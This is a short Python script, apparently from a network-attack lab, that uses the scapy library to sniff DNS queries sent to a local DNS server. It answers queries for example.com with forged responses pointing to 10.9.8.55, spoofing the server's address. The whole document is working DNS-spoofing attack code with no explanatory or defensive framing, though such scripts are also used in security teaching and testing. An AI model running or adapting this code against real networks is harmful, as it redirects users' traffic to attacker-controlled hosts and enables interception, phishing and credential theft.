from scapy.all import *
DNSServerIP = "192.168.10.3"
filter = "udp port 53 and ip dst " + DNSServerIP + " and not ip src " + DNSServerIP
def DNS_Responder(localIP):
    def getResponse(pkt):
        if (DNS in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 and pkt[IP].src != localIP):
            if "example.com" in pkt['DNS Question Record'].qname:
                spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
                    /UDP(dport=pkt[UDP].sport, sport=53)\
                    /DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,ancount=1,qr=1,\
                    an=DNSRR(rrname=pkt[DNSQR].qname,rdata='10.9.8.55')\
                    /DNSRR(rrname="example.com",rdata='10.9.8.55'))
                send(spfResp,verbose=0)
                return "Spoofed DNS Response Sent"

            return False
    return getResponse

sniff(filter=filter,prn=DNS_Responder(DNSServerIP))
